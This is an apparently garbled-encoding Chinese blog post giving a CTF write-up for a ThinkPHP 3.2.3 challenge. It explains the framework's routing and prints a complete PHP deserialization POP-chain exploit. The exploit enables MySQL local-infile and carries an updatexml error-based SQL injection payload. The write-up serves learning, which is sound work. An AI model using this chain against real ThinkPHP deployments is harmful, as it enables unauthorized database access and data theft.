<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="John Doe"/><meta name="copyright" content="John Doe"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="Hexo Theme MEOW"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="[çº¢æ˜è°·CTF_2021]EasyTP | Meiçš„å°çª"/><meta name="apple-mobile-web-app-title" content="[çº¢æ˜è°·CTF_2021]EasyTP | Meiçš„å°çª"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2025/07/07/çº¢æ˜è°·CTF-2021-EasyTP/"/><meta name="description" content="[çº¢æ˜è°·CTF_2021]EasyTPçœ‹è§è¿™ä¸ªç†Ÿæ‚‰çš„Easyå’Œåé¢çš„TPï¼Œè¿™å¾ˆå®¹æ˜“è®©æˆ‘æƒ³åˆ°è¿™æ˜¯ä¸€é“å¾ˆéš¾çš„ThinkPHPçš„ä»£ç å®¡è®¡é¢˜ç›® æˆ‘ä»¬ç›´æ¥www.zipå°†æºç ä¸‹è½½ä¸‹æ¥ï¼Œåœ¨ThinkPHP&#x2F;ThinkPHP.phpä¸­å‘ç°äº†ThinkPHPçš„ç‰ˆæœ¬ä¸º3.2.3   äºæ˜¯ç›´æ¥ç™¾åº¦è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´ åœ¨CVEä¸Šé¢åªçœ‹åˆ°äº†æ˜¯sqlæ³¨å…¥æ¼æ´ï¼Œåé¢åˆåœ¨ç½‘ä¸Šæ‰¾åˆ°äº†å¤§ä½¬çš„æ–‡ç«  å®åœ¨æ²¡æƒ³åˆ°è¿™æ˜¯ä¸€ä¸ªååºåˆ—åŒ–ç»“åˆs...">
<meta property="og:type" content="article">
<meta property="og:title" content="[çº¢æ˜è°·CTF_2021]EasyTP | Meiçš„å°çª">
<meta property="og:url" content="http://example.com/2025/07/07/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/index.html">
<meta property="og:site_name" content="Meiçš„å°çª">
<meta property="og:description" content="[çº¢æ˜è°·CTF_2021]EasyTPçœ‹è§è¿™ä¸ªç†Ÿæ‚‰çš„Easyå’Œåé¢çš„TPï¼Œè¿™å¾ˆå®¹æ˜“è®©æˆ‘æƒ³åˆ°è¿™æ˜¯ä¸€é“å¾ˆéš¾çš„ThinkPHPçš„ä»£ç å®¡è®¡é¢˜ç›® æˆ‘ä»¬ç›´æ¥www.zipå°†æºç ä¸‹è½½ä¸‹æ¥ï¼Œåœ¨ThinkPHP&#x2F;ThinkPHP.phpä¸­å‘ç°äº†ThinkPHPçš„ç‰ˆæœ¬ä¸º3.2.3   äºæ˜¯ç›´æ¥ç™¾åº¦è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´ åœ¨CVEä¸Šé¢åªçœ‹åˆ°äº†æ˜¯sqlæ³¨å…¥æ¼æ´ï¼Œåé¢åˆåœ¨ç½‘ä¸Šæ‰¾åˆ°äº†å¤§ä½¬çš„æ–‡ç«  å®åœ¨æ²¡æƒ³åˆ°è¿™æ˜¯ä¸€ä¸ªååºåˆ—åŒ–ç»“åˆs...">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2025/07/07/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/assets/images/Hexo-Theme-MEOW.png">
<meta property="article:published_time" content="2025-07-07T04:47:27.000Z">
<meta property="article:modified_time" content="2025-07-07T13:32:55.693Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2025/07/07/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>[çº¢æ˜è°·CTF_2021]EasyTP | Meiçš„å°çª</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
<link rel="stylesheet" href="/css/style.css">
<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 7.3.0"></head><body bg-style="none"><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="Home"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="Home"><div>Meiçš„å°çª</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"></div><div id="nav-function"><div id="menu-btn"><a href="javascript:void(0);" title="Toggle Menu"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="Home"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="Home">Meiçš„å°çª</a></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">ã€Œ MEOW ã€</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">[çº¢æ˜è°·CTF_2021]EasyTP</h1><div class="post-author"><span>Author: John Doe</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>Created: 2025-07-07</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>Updated: 2025-07-07</span></div></div><div class="post-read"></div></div><div class="post-attribute"></div></div><div class="post markdown" indent="false"><h1 id="çº¢æ˜è°·CTF-2021-EasyTP"><a href="#çº¢æ˜è°·CTF-2021-EasyTP" class="headerlink" title="[çº¢æ˜è°·CTF_2021]EasyTP"></a>[çº¢æ˜è°·CTF_2021]EasyTP</h1><p>çœ‹è§è¿™ä¸ªç†Ÿæ‚‰çš„Easyå’Œåé¢çš„TPï¼Œè¿™å¾ˆå®¹æ˜“è®©æˆ‘æƒ³åˆ°è¿™æ˜¯ä¸€é“å¾ˆéš¾çš„ThinkPHPçš„ä»£ç å®¡è®¡é¢˜ç›®</p>
<p>æˆ‘ä»¬ç›´æ¥<a target="_blank" rel="noopener" href="http://www.zipå°†æºç ä¸‹è½½ä¸‹æ¥,åœ¨thinkphp/ThinkPHP.php%E4%B8%AD%E5%8F%91%E7%8E%B0%E4%BA%86ThinkPHP%E7%9A%84%E7%89%88%E6%9C%AC%E4%B8%BA3.2.3">www.zipå°†æºç ä¸‹è½½ä¸‹æ¥ï¼Œåœ¨ThinkPHP/ThinkPHP.phpä¸­å‘ç°äº†ThinkPHPçš„ç‰ˆæœ¬ä¸º3.2.3</a></p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/07/07/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/image-20250707125132555.png" class title="image-20250707125132555">

<p>äºæ˜¯ç›´æ¥ç™¾åº¦è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´</p>
<p>åœ¨CVEä¸Šé¢åªçœ‹åˆ°äº†æ˜¯sqlæ³¨å…¥æ¼æ´ï¼Œåé¢åˆåœ¨ç½‘ä¸Šæ‰¾åˆ°äº†<a target="_blank" rel="noopener" href="https://f5.pm/go-53579.html">å¤§ä½¬çš„æ–‡ç« </a></p>
<p>å®åœ¨æ²¡æƒ³åˆ°è¿™æ˜¯ä¸€ä¸ªååºåˆ—åŒ–ç»“åˆsqlæ³¨å…¥çš„æ¼æ´</p>
<p>ä½†æ˜¯æˆ‘å‘ç°ä»é¢˜ç›®ä¸Šä¸‹è½½ä¸‹æ¥çš„<a target="_blank" rel="noopener" href="http://www.zipå¥½åƒä¸å…¨,ä¸ºæ­¤æˆ‘è¿˜ä¸“ç¨‹æŠŠæºç ç»™ä¸‹è½½ä¸‹æ¥äº†,ä½†æ˜¯ä¸‹è½½äº†æºç å‘ç°å¥½åƒç¼ºå¤±äº†ä¸€äº›æ–‡ä»¶,æŸ¥äº†ä¹‹åå‘ç°éœ€è¦åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹è¿è¡Œä¸€ä¸‹é¶åœºæ‰èƒ½åŠ è½½å®Œæˆ,ä½†ä»”ç»†çœ‹äº†æ‰å‘ç°æ˜¯ä¸€æ ·çš„/">www.zipå¥½åƒä¸å…¨ï¼Œä¸ºæ­¤æˆ‘è¿˜ä¸“ç¨‹æŠŠæºç ç»™ä¸‹è½½ä¸‹æ¥äº†ï¼Œä½†æ˜¯ä¸‹è½½äº†æºç å‘ç°å¥½åƒç¼ºå¤±äº†ä¸€äº›æ–‡ä»¶ï¼ŒæŸ¥äº†ä¹‹åå‘ç°éœ€è¦åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹è¿è¡Œä¸€ä¸‹é¶åœºæ‰èƒ½åŠ è½½å®Œæˆï¼Œä½†ä»”ç»†çœ‹äº†æ‰å‘ç°æ˜¯ä¸€æ ·çš„</a></p>
<p>é€ æˆæˆ‘è¯¯ä»¥ä¸ºæ–‡ä»¶ç¼ºå¤±çš„ä¸€ä¸ªé‡è¦åŸå› å°±æ˜¯æˆ‘çœ‹ä¸æ‡‚ThinkPHPæ¡†æ¶çš„ä»£ç ï¼Œæˆ‘ä»¬æœ€åè¿›è¡Œååºåˆ—åŒ–çš„urlæ˜¯</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/Home/Index/test</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>è¿™ä¸ªå°±å’Œæˆ‘ä»¬ä¸€èˆ¬çš„urlä¸ä¸€æ ·ï¼Œphpæ–‡ä»¶åé¢åˆæ¥ç€æ¥äº†è·¯å¾„è€Œä¸”è·¯å¾„æœ«å°¾å¹¶æ²¡æœ‰æŒ‡å‘phpæ–‡ä»¶ï¼Œè¿™å°±æ˜¯æˆ‘çœ‹ä¸æ‡‚çš„åœ°æ–¹</p>
<p>çœ‹äº†ä¸€ä¸‹ThinkPHPçš„è·¯ç”±è§„åˆ™ï¼Œå®åœ¨æœ‰ç‚¹éš¾ï¼Œä¸åŒç‰ˆæœ¬çš„è·¯ç”±è§„åˆ™ä¹Ÿä¸åŒï¼Œè¿˜æœ‰å¥½å‡ ç§è·¯ç”±è§£ææ¨¡å¼ï¼Œæˆ‘åªèƒ½çœ‹ä¸‹æˆ‘ä»¬é»˜è®¤çš„<code>PATH_INFO</code>æ¨¡å¼</p>
<p>ThinkPHP ä½¿ç”¨ <strong>â€œæ¨¡å—&#x2F;æ§åˆ¶å™¨&#x2F;æ–¹æ³•â€</strong> çš„è·¯ç”±æ ¼å¼ï¼Œä½† <strong>ä¸è¦æ±‚ç‰©ç†æ–‡ä»¶è·¯å¾„åŒ¹é… URL</strong>ã€‚</p>
<ul>
<li><strong>ç¤ºä¾‹ URL</strong>ï¼š<code>/Home/Index/test</code><ul>
<li><strong>Home</strong> â†’ æ¨¡å—åï¼ˆå¯¹åº” <code>application/Home</code> ç›®å½•ï¼‰</li>
<li><strong>Index</strong> â†’ æ§åˆ¶å™¨åï¼ˆå¯¹åº” <code>application/Home/controller/Index.php</code> æ–‡ä»¶ï¼‰</li>
<li><strong>test</strong> â†’ æ–¹æ³•åï¼ˆå¯¹åº” <code>Index</code> æ§åˆ¶å™¨ä¸­çš„ <code>test()</code> æ–¹æ³•ï¼‰</li>
</ul>
</li>
</ul>
<p>æ­£å¦‚æˆ‘ä»¬æ‰€è§ï¼ŒThinkPHPä¸­åº”è¯¥ä½¿ç”¨çš„æ˜¯å±‚å±‚é€’è¿›çš„æ–¹å¼ï¼Œæ¨¡å—åŒ…å«æ§åˆ¶å™¨ï¼Œç„¶åæ§åˆ¶å™¨åŒ…å«æ–¹æ³•</p>
<p>äºæ˜¯æˆ‘ä»¬è¿™ä¸ªurlè®¿é—®çš„å®é™…æ˜¯</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/07/07/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/image-20250707180402052.png" class title="image-20250707180402052">

<p>å’Œè¿™ä¸ªæ˜¯ä¸€æ ·çš„</p>
<p>è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯æˆ‘ä»¬è¿›è¡Œååºåˆ—åŒ–çš„èµ·ç‚¹</p>
<p>çœ‹äº†å¾ˆä¹…ï¼Œå‘ç°æˆ‘å¯¹ä¸€é—¨è¯­è¨€æ‰€çŸ¥ç”šå°‘ï¼Œè·ç¦»å¼€å‘çš„è·ç¦»ä¸æ˜¯ä¸€èˆ¬è¿œï¼Œæœ‰å¾ˆå¤šå¯ä»¥è¿èƒŒæˆ‘åŸæ¥å¸¸è¯†çš„åœ°æ–¹ï¼Œå¯ä»¥é€šè¿‡ä»£ç è‡ªå®šä¹‰é…ç½®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä»£ç å†™å‡ºä¸€äº›å¯ä»¥ç›´æ¥è°ƒç”¨çš„è‡ªå®šä¹‰å‡½æ•°</p>
<p>æ¯”å¦‚è¯´è¿™ä¸ªé¢˜ç›®æ˜¯æ€ä¹ˆé€šè¿‡åœ¨ä¸€ä¸ªphpæ–‡ä»¶ä¸­è¿›è¡Œååºåˆ—åŒ–ç„¶åå½±å“å…¶ä»–æ–‡ä»¶ä¸­ç±»çš„å±æ€§</p>
<p>æˆ‘ä»¬å…ˆæ¥çœ‹è¿™é“é¢˜ç›®çš„payload</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::<span class="variable constant_">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class="literal">true</span>    <span class="comment">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;thinkphp3&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Model</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>\<span class="title class_">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">Mysql</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>\<span class="title class_">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<p>ThinkPHPï¼ˆå°¤å…¶æ˜¯ 3.x ç‰ˆæœ¬ï¼‰ä½¿ç”¨ <strong>ç±»åæ˜ å°„æ–‡ä»¶è·¯å¾„</strong> çš„è‡ªåŠ¨åŠ è½½æœºåˆ¶ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><code>Think\Image\Driver\Imagick</code> â†’ å¯¹åº”æ–‡ä»¶ <code>Think/Image/Driver/Imagick.class.php</code></li>
<li><code>Think\Model</code> â†’ å¯¹åº”æ–‡ä»¶ <code>Think/Model.class.php</code></li>
</ul>
<p>å½“ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼š</p>
<ol>
<li>PHP æ ¹æ®åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„ç±»åï¼ˆå¦‚ <code>Think\Image\Driver\Imagick</code>ï¼‰<strong>è‡ªåŠ¨åŠ è½½å¯¹åº”çš„ç±»æ–‡ä»¶</strong>ã€‚</li>
<li>ç”±äº ThinkPHP çš„ç±»æ–‡ä»¶å·²ç»è¢«åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œååºåˆ—åŒ–åçš„å¯¹è±¡å¯ä»¥<strong>ç›´æ¥è®¿é—®è¿™äº›ç±»çš„å±æ€§å’Œæ–¹æ³•</strong>ï¼Œå³ä½¿å®ƒä»¬åˆ†å¸ƒåœ¨ä¸åŒçš„æ–‡ä»¶ä¸­ã€‚</li>
</ol>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°EXPä¸­</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::<span class="variable constant_">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class="literal">true</span>    <span class="comment">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;thinkphp3&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>é€šè¿‡<code>namespace Think\Db\Driver</code>å³å¯åŠ è½½åˆ°<code>Think\Db\Driver</code>ç›®å½•ä¸‹å»ï¼Œç„¶ååˆæœ‰<code>class Mysql</code>åŠ è½½<code>Mysql.class.php</code>(æ„Ÿè§‰å°±æ˜¯ä¸“é—¨ç”¨æ¥å­˜æ”¾ç±»çš„phpæ–‡ä»¶)ï¼Œ</p>
<p>å½“ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼š</p>
<ol>
<li>PHP æ ¹æ®åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„ç±»åï¼ˆå¦‚ <code>Think\Image\Driver\Imagick</code>ï¼‰<strong>è‡ªåŠ¨åŠ è½½å¯¹åº”çš„ç±»æ–‡ä»¶</strong>ã€‚</li>
<li>ç”±äº ThinkPHP çš„ç±»æ–‡ä»¶å·²ç»è¢«åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œååºåˆ—åŒ–åçš„å¯¹è±¡å¯ä»¥<strong>ç›´æ¥è®¿é—®è¿™äº›ç±»çš„å±æ€§å’Œæ–¹æ³•</strong>ï¼Œå³ä½¿å®ƒä»¬åˆ†å¸ƒåœ¨ä¸åŒçš„æ–‡ä»¶ä¸­ã€‚</li>
</ol>
<p>è¿™ä¼°è®¡å°±æ˜¯ä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥å®ç°popé“¾çš„æ„é€ </p>
<p>ä½†æ˜¯è¿™ä¸ªé¢˜ç›®å¯¹äºæˆ‘æ¥è¯´å®åœ¨å¤ªéš¾äº†ç­‰åˆ°åé¢æˆ‘æœ‰å®åŠ›äº†å†å›æ¥å†™å®Œå§ï¼Œåªéœ€è¦ä½¿ç”¨ä¸Šé¢é‚£ä¸ªexpçš„ç»“æœè¿›è¡ŒæŠ¥é”™æ³¨å…¥å³å¯æ‹¿åˆ°flag</p>
